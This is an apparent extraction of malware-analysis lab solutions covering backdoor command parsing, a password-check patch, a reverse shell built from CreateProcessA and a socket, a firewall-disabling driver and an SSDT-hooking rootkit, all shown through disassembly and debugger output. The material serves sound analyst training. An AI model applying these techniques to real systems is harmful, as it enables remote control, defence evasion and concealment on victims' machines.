Listing 9-1L shows the function setup and parameter check.
[Word Count: 9]

00402AF0        PUSH EBP
00402AF1        MOV EBP,ESP
00402AF3        MOV EAX,182C
00402AF8        CALL Lab09-01.00402EB0
00402AFD
 CMP DWORD PTR SS:[EBP+8],1
00402B01        JNZ SHORT Lab09-01.00402B1D
[Word Count: 21]

Listing 9-1L: Function setup and argc comparison
[Word Count: 7]

Figure 9-2L: Choosing to debug arguments
Figure 9-3L: Adding the -in argument
[Word Count: 12]

arithmetic to select the last element in the array of command-line parame-
ters. This pointer ends up in EAX, and is pushed onto the top of the stack 
prior to the function call.
[Word Count: 33]

00402B1D      MOV EAX,DWORD PTR SS:[EBP+8]        ; ARGC
00402B20      MOV ECX,DWORD PTR SS:[EBP+C]        ; ARGV
00402B23        MOV EDX,DWORD PTR DS:[ECX+EAX*4-4] 
00402B27        MOV DWORD PTR SS:[EBP-4],EDX
00402B2A        MOV EAX,DWORD PTR SS:[EBP-4]
00402B2D        PUSH EAX
[Word Count: 33]

Listing 9-2L: Pointer to the last element in argv is pushed on the stack
[Word Count: 14]

The basic disassembly view provided by OllyDbg gives a rough overview 
of the function that starts at address 0x402510. There are no function calls, 
but by scanning the instructions, we see the use of the arithmetic operations 
ADD, SUB, MUL, and XOR on byte-sized operands, such as at addresses 0x402532 
through 0x402539. It looks like this routine does a sanity check of the input 
using a convoluted, hard-coded algorithm. Most likely the input is some type 
of password or code.
[Word Count: 80]

NOTE
If you perform a full analysis of 0x4025120, you can determine that the password 
is abcd. You will be equally successful using the password or the patch method we 
explain next.
[Word Count: 32]

B8 01 00 00 00        MOV EAX, 0x1
C3                    RET
[Word Count: 10]

Listing 9-3L: Patch code for the password check
[Word Count: 8]

We assemble these instructions using the Assemble option in OllyDbg 
and get the 6-byte sequence: B8 01 00 00 00 C3. Because the CALL instruction 
prepares the stack, and the RET instruction cleans it up, we can overwrite the 
instructions at the very beginning of the password check function, at address 
0x402510. Edit the instructions by right-clicking the start address you wish 
to edit and selecting BinaryEdit. Figure 9-4L shows the relevant context 
menu items.
[Word Count: 75]

Figure 9-5L: Inserting new instructions
Figure 9-6L: State of the stack 
at address 0x402B57
[Word Count: 14]

Figure 9-7L: Stack state at call to CreateServiceA at address 0x402805
[Word Count: 11]

Figure 9-8L: Networking strings seen in memory
[Word Count: 7]

With the installation routine of the malware documented, we can now 
explore the other functionality by continuing to debug it with OllyDbg or 
disassembling it with IDA Pro. First, we’ll use IDA Pro to describe other code
[Word Count: 37]

paths. This sample supports the switches -in, -re, -c, and -cc, as shown in 
Table 9-1L. These can be easily identified in the main function by looking for 
calls to __mbscmp.
[Word Count: 31]

C:>Lab09-01-patched.exe –cc epar
k:ups h:http://www.practicalmalwareanalysis.com p:80 per:60
[Word Count: 7]

Table 9-1L: Supported Command-Line Switches
[Word Count: 5]

Command-line switch
Address of implementation
Behavior
[Word Count: 6]

Figure 9-9L: Configuration registry value
[Word Count: 5]

The backdoor functionality is implemented in a chain of functions first 
called from the infinite loop. The function at 0x402020 calls the function 
starting at address 0x401E60, and compares the beginning of the string 
returned against a list of the supported values: SLEEP, UPLOAD, DOWNLOAD, CMD, 
and NOTHING. If the malware encounters one of these strings, it will call a func-
tion that responds to that request, in a process similar to the parsing of the 
command-line arguments. Table 9-2L summarizes the supported commands, 
showing the adjustable parameters in italics.
[Word Count: 90]

Command
Address of 
implementation
Command-string 
format
Behavior
[Word Count: 7]

SLEEP
0x402076
SLEEP secs
Sleeps for secs seconds
[Word Count: 8]

UPLOAD
0x4019E0
UPLOAD port 
filename
Creates the file filename on the local 
system by first connecting to the remote 
host over port port and reading the 
contents
[Word Count: 27]

DOWNLOAD
0x401870
DOWNLOAD port 
filename
Reads the file filename and sends it to 
the remote host over port port
[Word Count: 19]

NOTE
UPLOAD and DOWNLOAD commands are reversed from their standard usage. Always focus 
on the underlying functionality for your analysis and not the individual strings used 
by the malware.
[Word Count: 29]

CMD
0x402268
CMD port 
command
Executes the shell command command 
with cmd.exe and sends the output to 
the remote host over port port
[Word Count: 23]

Table 9-2L: Supported Commands (continued)
[Word Count: 5]

Command
Address of 
implementation
Command-string 
format
Behavior
[Word Count: 7]

1.
The imports and the string cmd are the only interesting strings that 
appear statically in the binary.
[Word Count: 18]

3.
Rename the file ocl.exe before you run it.
[Word Count: 9]

4.
A string is being built on the stack, which is used by attackers to obfuscate 
strings from simple strings utilities and basic static analysis techniques.
[Word Count: 26]

5.
The string 1qaz2wsx3edc and a pointer to a buffer of data are passed to 
subroutine 0x401089.
[Word Count: 17]

6.
The malware uses the domain practicalmalwareanalysis.com.
[Word Count: 7]

7.
The malware will XOR the encoded DNS name with the string 
1qaz2wsx3edc to decode the domain name.
[Word Count: 18]

8.
The malware is setting the stdout, stderr, and stdin handles (used in the 
STARTUPINFO structure of CreateProcessA) to the socket. Since CreateProcessA 
is called with cmd as an argument, this will create a reverse shell by tying 
the command shell to the socket.
[Word Count: 44]

If we click the Run button, we hit the first breakpoint at main. The first thing 
to notice is a large series of mov instructions moving single bytes into local 
variables beginning at , as shown in Listing 9-4L.
[Word Count: 39]

00401128         push    ebp
00401129         mov     ebp, esp
0040112B         sub     esp, 304h
00401131         push    esi
00401132         push    edi
00401133         mov     [ebp+var_1B0], 31h 
0040113A         mov     [ebp+var_1AF], 71h
00401141         mov     [ebp+var_1AE], 61h
00401148         mov     [ebp+var_1AD], 7Ah
0040114F         mov     [ebp+var_1AC], 32h
00401156         mov     [ebp+var_1AB], 77h
0040115D         mov     [ebp+var_1AA], 73h
00401164         mov     [ebp+var_1A9], 78h
0040116B         mov     [ebp+var_1A8], 33h
00401172         mov     [ebp+var_1A7], 65h
00401179         mov     [ebp+var_1A6], 64h
00401180         mov     [ebp+var_1A5], 63h
00401187         mov     [ebp+var_1A4], 0 
[Word Count: 71]

0040118E         mov     [ebp+Str1], 6Fh
00401195         mov     [ebp+var_19F], 63h
0040119C         mov     [ebp+var_19E], 6Ch
004011A3         mov     [ebp+var_19D], 2Eh
004011AA         mov     [ebp+var_19C], 65h
004011B1         mov     [ebp+var_19B], 78h
004011B8         mov     [ebp+var_19A], 65h
004011BF         mov     [ebp+var_199], 0 
[Word Count: 33]

Listing 9-4L: Building an ASCII string on the stack, one character at a time
[Word Count: 14]

00401208     call    ds:GetModuleFileNameA 
0040120E     push    5Ch         ; Ch
00401210     lea     ecx, [ebp+Str]
00401216     push    ecx         ; Str
00401217     call    _strrchr 
[Word Count: 22]

Listing 9-5L: IDA Pro labels strrchr properly, but OllyDbg does not.
[Word Count: 11]

0040121F     mov     [ebp+Str2], eax
00401222     mov     edx, [ebp+Str2]
00401225     add     edx, 1 
00401228     mov     [ebp+Str2], edx
0040122B     mov     eax, [ebp+Str2]
0040122E     push    eax         ; Str2
0040122F     lea     ecx, [ebp+Str1]
00401235     push    ecx         ; Str1
00401236     call    _strcmp
[Word Count: 38]

Listing 9-6L: IDA Pro labels strcmp properly, but OllyDbg does not.
[Word Count: 11]

004010E3     cmp     [ebp+var_108], 20h
004010EA
jge     short loc_40111D 
004010EC     mov     edx, [ebp+arg_4]
004010EF     add     edx, [ebp+var_108]
004010F5     movsx   ecx, byte ptr [edx]
004010F8     mov     eax, [ebp+var_108]
004010FE     cdq
004010FF     idiv    [ebp+var_104]
[Word Count: 32]

00401105     mov     eax, [ebp+Str]
00401108     movsx   edx, byte ptr [eax+edx] 
0040110C     xor     ecx, edx 
0040110E     mov     eax, [ebp+var_108]
00401114     mov     [ebp+eax+var_100], cl
0040111B     jmp     short loc_4010D4
[Word Count: 28]

Listing 9-7L: String decoding functionality
[Word Count: 5]

This appears to be a reverse shell, created using a method that’s popular 
among malware authors. In this method, the STARTUPINFO structure that is 
passed to CreateProcessA is manipulated. CreateProcessA is called, and it runs 
cmd.exe with its window suppressed, so that it isn’t visible to the user under 
attack. Before the call to CreateProcessA, a socket is created and a connection 
is established to a remote server. That socket is tied to the standard streams 
(stdin, stdout, and stderr) for cmd.exe.
Listing 9-8L shows this method of reverse shell creation in action.
[Word Count: 93]

0040103B     mov     [ebp+StartupInfo.wShowWindow], SW_HIDE 
00401041     mov     edx, [ebp+Socket]
00401044     mov     [ebp+StartupInfo.hStdInput], edx 
00401047     mov     eax, [ebp+StartupInfo.hStdInput]
0040104A     mov     [ebp+StartupInfo.hStdError], eax 
0040104D     mov     ecx, [ebp+StartupInfo.hStdError]
00401050     mov     [ebp+StartupInfo.hStdOutput], ecx 
00401053     lea     edx, [ebp+ProcessInformation]
00401056     push    edx         ; lpProcessInformation
00401057     lea     eax, [ebp+StartupInfo]
0040105A     push    eax         ; lpStartupInfo
0040105B     push    0           ; lpCurrentDirectory
0040105D     push    0           ; lpEnvironment
0040105F     push    0           ; dwCreationFlags
00401061     push    1           ; bInheritHandles
00401063     push    0           ; lpThreadAttributes
00401065     push    0           ; lpProcessAttributes
00401067     push    offset CommandLine ; "cmd" 
0040106C     push    0           ; lpApplicationName
0040106E     call    ds:CreateProcessA
[Word Count: 95]

Listing 9-8L: Creating a reverse shell using CreateProcessA and the STARTUPINFO structure
[Word Count: 12]

1.
The import table contains kernel32.dll, NetAPI32.dll, DLL1.dll, and 
DLL2.dll. The malware dynamically loads user32.dll and DLL3.dll.
[Word Count: 17]

2.
All three DLLs request the same base address: 0x10000000.
[Word Count: 10]

3.
DLL1.dll is loaded at 0x10000000, DLL2.dll is loaded at 0x320000, and 
DLL3.dll is loaded at 0x380000 (this may be slightly different on your 
machine).
[Word Count: 25]

4.
DLL1Print is called, and it prints “DLL 1 mystery data,” followed by the 
contents of a global variable.
[Word Count: 19]

5.
DLL2ReturnJ returns a filename of temp.txt which is passed to the call to 
WriteFile.
[Word Count: 15]

6.
Lab09-03.exe gets the buffer for the call to NetScheduleJobAdd from 
DLL3GetStructure, which it dynamically resolves.
[Word Count: 16]

7.
Mystery data 1 is the current process identifier, mystery data 2 is the 
handle to the open temp.txt file, and mystery data 3 is the location in 
memory of the string ping www.malwareanalysisbook.com.
[Word Count: 34]

8.
Select Manual Load when loading the DLL with IDA Pro, and then type 
the new image base address when prompted. In this case, the address is 
0x320000.
[Word Count: 28]

Figure 9-10L: Finding the requested base address with PEview
[Word Count: 9]

Figure 9-11L: Using the OllyDbg memory map 
to examine DLL load locations
[Word Count: 12]

Listing 9-9L shows the calls to the exports of DLL1.dll and DLL2.dll.
[Word Count: 12]

00401006         call    ds:DLL1Print
0040100C         call    ds:DLL2Print
00401012         call    ds:DLL2ReturnJ
00401018         mov     [ebp+hObject], eax 
0040101B         push    0                       ; lpOverlapped
0040101D         lea     eax, [ebp+NumberOfBytesWritten]
00401020         push    eax                     ; lpNumberOfBytesWritten
00401021         push    17h                     ; nNumberOfBytesToWrite
00401023         push    offset aMalwareanalysi  ; "malwareanalysisbook.com"
00401028         mov     ecx, [ebp+hObject]
0040102B         push    ecx                 
; hFile
0040102C         call    ds:WriteFile
[Word Count: 52]

Listing 9-9L: Calls to the exports of DLL1.dll and DLL2.dll from Lab09-03.exe
[Word Count: 12]

At the start of Listing 9-9L, we see a call to DLL1Print, which is an 
export of DLL1.dll. We disassemble DLL1.dll with IDA Pro and see that the 
function prints “DLL 1 mystery data,” followed by the contents of a global 
variable, dword_10008030. If we examine the cross-references to dword_10008030, 
we see that it is accessed in DllMain when the return value from the call
[Word Count: 65]

00401071         lea     edx, [ebp+Buffer]
00401074         push    edx
00401075         call    [ebp+var_10]        
; DLL3GetStructure
00401078         add     esp, 4
0040107B         lea     eax, [ebp+JobId]
0040107E         push    eax                     ; JobId
0040107F         mov     ecx, [ebp+Buffer]
00401082         push    ecx                     ; Buffer
00401083         push    0                       ; Servername
00401085         call    NetScheduleJobAdd
[Word Count: 43]

Listing 9-10L: Calls to DLL3GetStructure followed by NetScheduleJobAdd in Lab09-03.exe
[Word Count: 10]

It appears that the result of that call is the structure pointed to by Buffer, 
which is subsequently passed to NetScheduleJobAdd. Viewing the MSDN page 
for NetScheduleJobAdd tells us that Buffer is a pointer to an AT_INFO structure.
[Word Count: 38]

The AT_INFO structure can be applied to the data in DLL3.dll. First, load 
DLL3.dll into IDA Pro, press the INSERT key within the Structures window, and 
add the standard structure AT_INFO. Next, go to dword_1000B0A0 in memory and
[Word Count: 38]

select EditStruct Var and click AT_INFO. This will cause the data to be more 
readable, as shown in Listing 9-11L. We can see that the scheduled job will be 
set to ping malwareanalysisbook.com every day of the week at 1:00 AM.
[Word Count: 41]

10001022         mov     stru_1000B0A0.Command, offset WideCharStr ; "ping www..."
1000102C         mov     stru_1000B0A0.JobTime, 36EE80h
10001036         mov     stru_1000B0A0.DaysOfMonth, 0
10001040         mov     stru_1000B0A0.DaysOfWeek, 7Fh
10001047         mov     stru_1000B0A0.Flags, 11h
[Word Count: 24]

Specifying a New Image Base with IDA Pro
[Word Count: 8]

We can load DLL2.dll into IDA Pro in a different location by checking the 
Manual Load box when loading the DLL. In the field that says Please specify 
the new image base, we type 320000. IDA Pro will do the rest to adjust all of 
the offsets, just as OllyDbg did when loading the DLL.
[Word Count: 55]

This lab demonstrated how to determine where three DLLs are loaded into 
Lab09-03.exe using OllyDbg. We loaded these DLLs into IDA Pro to perform 
full analysis, and then figured out the mystery data printed by the malware: 
mystery data 1 is the current process identifier, mystery data 2 is the handle 
to the open temp.txt, and mystery data 3 is the location in memory of the 
string ping www.malwareanalysisbook.com. Finally, we applied the Windows 
AT_INFO structure within IDA Pro to aid our analysis of DLL3.dll.
[Word Count: 85]

1.
If you run procmon to monitor this program, you will see that the only 
call to write to the registry is to RegSetValue for the value HKLM\SOFTWARE\
Microsoft\Cryptography\RNG\Seed. Some indirect changes are made by the 
calls to CreateServiceA, but this program also makes direct changes to the 
registry from the kernel that go undetected by procmon.
[Word Count: 57]

2.
To set a breakpoint to see what happens in the kernel, you must open 
the executable within an instance of WinDbg running in the virtual 
machine, while also debugging the kernel with another instance of 
WinDbg in the host machine. When Lab10-01.exe is stopped in the vir-
tual machine, you first use the !drvobj command to get a handle to the 
driver object, which contains a pointer to the unload function. Next, 
you can set a breakpoint on the unload function within the driver. The 
breakpoint will be triggered when you restart Lab10-01.exe.
[Word Count: 94]

3.
This program creates a service to load a driver. The driver code then 
creates (or modifies, if they exist) the registry keys \Registry\Machine\
SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile and
[Word Count: 26]

\Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile. 
Setting these registry keys disables the Windows XP firewall.
[Word Count: 10]

EnableFirewall
\Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
\Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
\Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall
\Registry\Machine\SOFTWARE\Policies\Microsoft
[Word Count: 5]

00401004  push    0F003Fh         
; dwDesiredAccess
00401009  push    0               
; lpDatabaseName
0040100B  push    0               
; lpMachineName
0040100D call    ds:OpenSCManagerA ; Establish a connection to the service
0040100D                          
; control manager on the specified computer
0040100D                          
; and opens the specified database
00401013  mov     edi, eax
[Word Count: 44]

00401015  test    edi, edi
00401017  jnz     short loc_401020
00401019  pop     edi
0040101A  add     esp, 1Ch
0040101D  retn    10h
00401020 loc_401020:
00401020  push    esi
00401021  push    0               ; lpPassword
00401023  push    0               ; lpServiceStartName
00401025  push    0               ; lpDependencies
00401027  push    0               ; lpdwTagId
00401029  push    0               ; lpLoadOrderGroup
0040102B push    offset BinaryPathName ; "C:\\Windows\\System32\\Lab10-01.sys"
00401030  push    1               ; dwErrorControl
00401032 push    3               ; dwStartType
00401034  push    1               ; dwServiceType
00401036  push    0F01FFh         ; dwDesiredAccess
0040103B  push    offset ServiceName ; "Lab10-01"
00401040  push    offset ServiceName ; "Lab10-01"
00401045  push    edi             ; hSCManager
00401046 call    ds:CreateServiceA
[Word Count: 94]

Listing 10-1L: main method of Lab10-01.exe
[Word Count: 6]

00401052  push    0F01FFh         
; dwDesiredAccess
00401057  push    offset ServiceName ; "Lab10-01"
0040105C  push    edi             
; hSCManager
0040105D call    ds:OpenServiceA
[Word Count: 19]

Listing 10-2L: Call to OpenServiceA to get a handle to the service for Lab10-01
[Word Count: 14]

Next, the program calls StartServiceA to start the service, as shown in List-
ing 10-3L at . Finally, it calls ControlService at . The second parameter to 
ControlService is what type of control message is being sent. In this case, the 
value is 0x01 at , which we look up in the documentation and find that it 
means SERVICE_CONTROL_STOP. This will unload the driver and call the driver’s 
unload function.
[Word Count: 70]

00401069  push    0               ; lpServiceArgVectors
0040106B  push    0               ; dwNumServiceArgs
0040106D  push    esi             ; hService
0040106E call    ds:StartServiceA
[Word Count: 18]

00401074  test    esi, esi
00401076  jz      short loc_401086
00401078  lea     eax, [esp+24h+ServiceStatus]
0040107C  push    eax             ; lpServiceStatus
0040107D push    1               ; dwControl
0040107F  push    esi             ; hService
00401080 call    ds:ControlService ; Send a control code to a Win32 service
[Word Count: 39]

Listing 10-3L: Call to ControlService from Lab10-01.exe
[Word Count: 7]

Before we try to analyze the driver with WinDbg, we can open the driver in 
IDA Pro to examine the DriverEntry function. When we first open the driver 
and navigate to the entry point, we see the code in Listing 10-4L.
[Word Count: 41]

00010959  mov     edi, edi
0001095B  push    ebp
0001095C  mov     ebp, esp
0001095E  call    sub_10920
00010963  pop     ebp
00010964  jmp    sub_10906
[Word Count: 20]

Listing 10-4L: Code at the entry point of Lab10-01.sys
[Word Count: 9]

This function is the entry point of the driver, but it’s not the DriverEntry 
function. The compiler inserts wrapper code around the DriverEntry. The 
real DriverEntry function is located at sub_10906 .
As shown in Listing 10-5L, the main body of the DriverEntry function 
appears to move an offset value into a memory location, but otherwise it 
doesn’t make any function calls or interact with the system.
[Word Count: 67]

00010906  mov     edi, edi
00010908  push    ebp
00010909  mov     ebp, esp
0001090B  mov     eax, [ebp+arg_0]
0001090E  mov     dword ptr [eax+34h], offset loc_10486
00010915  xor     eax, eax
00010917  pop     ebp
00010918  retn    8
[Word Count: 32]

Listing 10-5L: The DriverEntry routine for Lab10-01.sys
[Word Count: 7]

Now, we can use WinDbg to examine Lab10-01.sys to see what happens when 
ControlService is called to unload Lab10-01.sys. The code in the user-space 
executable loads Lab10-10.sys and then immediately unloads it. If we use the 
kernel debugger before running the malicious executable, the driver will not 
yet be in memory, so we won’t be able to examine it. But if we wait until after 
the malicious executable is finished executing, the driver will already have 
been unloaded from memory.
[Word Count: 80]

In order to analyze Lab10-01.sys with WinDbg while it is loaded in mem-
ory, we’ll load the executable into WinDbg within the virtual machine. We 
set a breakpoint between the time that the driver is loaded and unloaded, at 
the ControlService call, with the following command:
[Word Count: 46]

Then we start the program and wait until the breakpoint is hit. When the 
breakpoint is hit, we are presented with the following information in WinDbg:
[Word Count: 26]

Breakpoint 0 hit
eax=0012ff1c ebx=7ffdc000 ecx=77defb6d edx=00000000 esi=00144048 edi=00144f58
eip=00401080 esp=0012ff08 ebp=0012ffc0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
image00400000+0x1080:
[Word Count: 29]

Once the program is stopped at the breakpoint, we move out of the vir-
tual machine in order to connect the kernel debugger and get information 
about Lab10-01.sys. We open another instance of WinDbg and select File
Kernel Debug with pipe set to \\.\pipe\com_1 and a baud rate of 115200 to con-
nect the instance of WinDbg running in the host machine to the kernel of 
the guest machine. We know that our service is called Lab10-01, so we can get 
a driver object by using the !drvobj command, as shown in Listing 10-6L.
[Word Count: 94]

kd> !drvobj lab10-01
Driver object  (8263b418) is for:
Loading symbols for f7c47000     Lab10-01.sys ->   Lab10-01.sys
*** ERROR: Module load completed but symbols could not be loaded for Lab10-01.sys
 \Driver\Lab10-01
Driver Extension List: (id , addr)
[Word Count: 36]

Listing 10-6L: Locating the device object for Lab10-01
[Word Count: 8]

The output of the !drvobj command gives us the address of the driver 
object at . Because there are no devices listed in the device object list at , 
we know that this driver does not have any devices that are accessible by user-
space applications.
[Word Count: 46]

NOTE
To resolve any difficulty locating the service name, you can get a list of driver objects 
currently in the kernel with the !object \Driver command.
[Word Count: 26]

Once we have the address of the driver object, we can view it using the dt 
command, as shown in Listing 10-7L.
[Word Count: 22]

kd> dt _DRIVER_OBJECT 8263b418
nt!_DRIVER_OBJECT
   +0x000 Type             : 4
   +0x002 Size             : 168
[Word Count: 13]

+0x004 DeviceObject     : (null) 
   +0x008 Flags            : 0x12
   +0x00c DriverStart      : 0xf7c47000 
   +0x010 DriverSize       : 0xe80
   +0x014 DriverSection    : 0x826b2c88 
   +0x018 DriverExtension  : 0x8263b4c0 _DRIVER_EXTENSION
   +0x01c DriverName       : _UNICODE_STRING "\Driver\Lab10-01"
   +0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\
HARDWARE\DESCRIPTION\SYSTEM"
   +0x028 FastIoDispatch   : (null) 
   +0x02c DriverInit       : 0xf7c47959     long  +0
   +0x030 DriverStartIo    : (null) 
   +0x034 DriverUnload     : 0xf7c47486     void  +0
   +0x038 MajorFunction    : [28] 0x804f354a     long  nt!IopInvalidDeviceRequest+0
[Word Count: 64]

Listing 10-7L: Viewing the driver object for Lab10-01.sys in WinDbg
[Word Count: 10]

We’re trying to identify the function called when the driver is unloaded—
information at offset 0x034, DriverUnload, as shown at . Then we set a break-
point using the following command:
[Word Count: 31]

kd> lm
start
end        module name
...
f7c47000 f7c47e80   Lab10_01   (no symbols)     
...
[Word Count: 13]

As you can see, the file is loaded at 0xf7c47000 at , and from earlier, we 
know the unload function is located at 0xf7c47486. We subtract 0xf7c47000
[Word Count: 27]

from 0xf7c47486 to get the offset (0x486), which we then use to navigate to 
the unload function in IDA Pro. For example, if the base load address in 
IDA Pro is 0x00100000, then we navigate to address 0x00100486 to find the 
unload function in IDA Pro. We can then use static analysis and IDA Pro to 
confirm what we discovered in WinDbg.
Alternatively, we can change the base address in IDA Pro by selecting 
EditSegmentsRebase Program and changing the base address value 
from 0x00100000 to 0xf7c47000.
[Word Count: 86]

NOTE
If you tried to use a deferred breakpoint using the bu $iment(Lab10-01), you may have 
run into trouble because WinDbg changes hyphens to underscores when it encounters 
them in filenames. The correct command to break on the entry point of the driver in this 
lab would be bu $iment(Lab10_01). This behavior is not documented anywhere and 
may be inconsistent across versions of WinDbg.
[Word Count: 64]

1.
The program creates the file C:\Windows\System32\Mlwx486.sys. You can 
use procmon or another dynamic monitoring tool to see the file being 
created, but you cannot see the file on disk because it is hidden.
[Word Count: 34]

2.
The program has a kernel component. It is stored in the file’s resource 
section, and then written to disk and loaded into the kernel as a service.
[Word Count: 28]

3.
The program is a rootkit designed to hide files. It uses SSDT hooking 
to overwrite the entry to NtQueryDirectoryFile, which it uses to prevent 
the display of any files beginning with Mlwx (case-sensitive) in directory 
listings.
[Word Count: 37]

C:\Windows\System32, we find that there’s nothing there. We can see in proc-
mon that the file is created, and there are no calls that would delete the file. 
Based on the facts that the file doesn’t appear but we don’t see how it was 
deleted and that a driver is involved, we should be suspicious that we’re deal-
ing with a rootkit.
[Word Count: 62]

Figure 10-1L: An executable file stored in the resource section of Lab10-02.exe
[Word Count: 12]

In order to continue investigating, we want to check to see if our kernel 
driver is loaded. To do that, we use the sc command to check on the status 
of the service that is running our kernel driver, as shown in Listing 10-8L.
[Word Count: 44]

SERVICE_NAME: 486 WS Driver
        TYPE               : 
1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
[Word Count: 27]

Listing 10-8L: Using the sc command to get information about a service
[Word Count: 12]

We query for the service name 486 WS Driver at , which was specified 
in the call to CreateServiceA. We see at  that the service is still running, 
which tells us that the kernel code is in memory. Something fishy is going on 
because the driver is still running, but it’s not on disk. Now, to determine 
what’s going on, we connect the kernel debugger to our virtual machine, and 
we check to see if the driver was actually loaded using the lm command. We 
see an entry that matches the filename that was created by Lab10-02.exe:
[Word Count: 98]

f7c4d000 f7c4dd80   Mlwx486    (deferred)
[Word Count: 4]

We are now certain that the driver is loaded into memory with the file-
name Mlwx486.sys, but the file does not appear on disk, suggesting that this 
might be a rootkit.
Next, we check the SSDT for any modified entries, as shown in 
Listing 10-9L.
[Word Count: 45]

kd> dd dwo(KeServiceDescriptorTable) L100
...
80501dbc  8060cb50 8060cb50 8053c02e 80606e68
80501dcc  80607ac8 f7c4d486 805b3de0 8056f3ca
80501ddc  806053a4 8056c222 8060c2dc 8056fc46
...
[Word Count: 21]

Listing 10-9L: An excerpt from the SSDT with one entry that has been modified by a rootkit
[Word Count: 17]

f7c4d490 ff7530          push    dword ptr [ebp+30h]
f7c4d493 ff752c          push    dword ptr [ebp+2Ch]
f7c4d496 ff7528          push    dword ptr [ebp+28h]
f7c4d499 ff7524          push    dword ptr [ebp+24h]
f7c4d49c ff7520          push    dword ptr [ebp+20h]
f7c4d49f 56              push    esi
f7c4d4a0 ff7518          push    dword ptr [ebp+18h]
f7c4d4a3 ff7514          push    dword ptr [ebp+14h]
[Word Count: 46]

f7c4d4a6 ff7510          push    dword ptr [ebp+10h]
f7c4d4a9 ff750c          push    dword ptr [ebp+0Ch]
f7c4d4ac ff7508          push    dword ptr [ebp+8]
f7c4d4af e860000000      call    Mlwx486+0x514 (f7c4d514)
[Word Count: 23]

Listing 10-10L: Assembly listing of PatchFunction
[Word Count: 6]

NOTE
It’s probably not completely clear from Listing 10-10L that the function being called is 
NtQueryDirectoryFile. However, if we single-step over the call function, we see that it 
goes to another section of the file that jumps to NtQueryDirectoryFile. In IDA Pro, this 
call would have been labeled NtQueryDirectoryFile, but the disassembler included in 
WinDbg is much less sophisticated. Ideally, we would have the file to view in IDA Pro 
while we are debugging, but we can’t find this file because it’s hidden.
[Word Count: 83]

kd> bp f7c4d486 ".if dwo(esp+0x24)==0 {} .else {gc}"
[Word Count: 8]

NOTE
If you have Windows Explorer open in a directory, you might see this breakpoint hit 
over and over again in different threads, which could be annoying while you’re trying 
to analyze the function. To make it easier to analyze, you should close all of your Win-
dows Explorer windows and use the dir command at a command line to trigger the 
breakpoint.
[Word Count: 63]

Once the code filters out interesting calls, we see another function 
stored at offset 0xf7c4d590. Although it isn’t automatically labeled by 
WinDbg, we can determine that it is RtlCompareMemory by looking at the 
disassembly or stepping into the function call. The code in Listing 10-11L 
shows the call to RtlCompareMemory at .
[Word Count: 52]

f7c4d4ca 6a08            push    8
f7c4d4cc 681ad5c4f7      push    offset Mlwx486+0x51a (f7c4d51a)
f7c4d4d1 8d465e         lea     eax,[esi+5Eh]
f7c4d4d4 50              push    eax
f7c4d4d5 32db            xor     bl,bl
f7c4d4d7 ff1590d5c4f7    call    dword ptr [Mlwx486+0x590 (f7c4d590)]
[Word Count: 29]

f7c4d4dd 83f808          cmp     eax,8
f7c4d4e0 7512            jne     Mlwx486+0x4f4 (f7c4d4f4)
[Word Count: 9]

Listing 10-11L: Comparison of the filename to determine whether the rootkit will modify the 
returned information from NtQueryDirectoryFile
[Word Count: 18]

kd> db esi+5e
036a302e  49 00 6e 00 73 00 74 00-61 00 6c 00 6c 00 65 00  I.n.s.t.a.l.l.e.
036a303e  72 00 68 00 00 00 00 00-00 00 f6 bb be f0 6e 70  r.h...........np
036a304e  c7 01 47 c0 db 46 25 75-cb 01 50 1e c1 f0 6e 70  ..G..F%u..P...np
036a305e  c7 01 50 1e c1 f0 6e 70-c7 01 00 00 00 00 00 00  ..P...np........
[Word Count: 71]

Listing 10-12L: Examining the first argument to RtlCompareMemory
[Word Count: 8]

The other operand of the comparison is the fixed location f7c4d51a, and 
we can use the db command to view that as well. Listing 10-13L shows that the 
second parameter to RtlCompareMemory stores the letters Mlwx, which reminds 
us of the driver Mlwx486.sys.
[Word Count: 43]

kd> db f7c4d51a
f7c4d51a  4d 00 6c 00 77 00 78 00-00 00 00 00 00 00 00 00  M.l.w.x.........
f7c4d52a  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
f7c4d53a  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
[Word Count: 54]

Listing 10-13L: Examining the second argument to RtlCompareMemory
[Word Count: 8]

The call to RtlCompareMemory specifies a size of 8 bytes, which represents 
four characters in wide character strings. The code is comparing every file to 
see if it starts with the four characters Mlwx. We now have a pretty good idea 
that this driver is hiding files that begin with Mlwx.
[Word Count: 51]

Having discovered which filenames PatchFunction will operate on, we analyze 
how it will change the return values of NtQueryDirectoryFile. Examining the 
documentation for NtQueryDirectoryFile, we see the FileInformation structure 
with a series of FILE_BOTH_DIR_INFORMATION structures. The first field in the 
FILE_BOTH_DIR_INFORMATION structure is the offset that points to the next 
FILE_BOTH_DIR_INFORMATION. As shown in Figure 10-2L, PatchFunction manipu-
lates this field to hide certain files from the directory listing by moving the
[Word Count: 72]

offset forward to point to the next entry if the current entry has a filename 
beginning with Mlwx.
Figure 10-2L shows what the return value of NtQueryDirectoryFile looks like 
for a directory that contains three files. There is one FILE_BOTH_DIR_INFORMATION 
structure for each file. Normally, the first structure would point to the second, 
and the second would point to the third, but the rootkit has modified the 
structure so that the first structure points to the third, thereby hiding the 
middle structure. This trick ensures that any files that begin with Mlwx are 
skipped and hidden from directory listings.
[Word Count: 99]

Figure 10-2L: A series of FILE_BOTH_DIR_INFORMATION structures being 
modified so that the middle structure is hidden
[Word Count: 16]

Having identified the program that is hiding files, we can try to obtain the 
original file used by the driver in order to perform additional analysis. There 
are several ways to do this:
[Word Count: 33]

1.
Disable the service that starts the driver and reboot. When you reboot, 
the code won’t be running and the file won’t be hidden.
[Word Count: 24]

2.
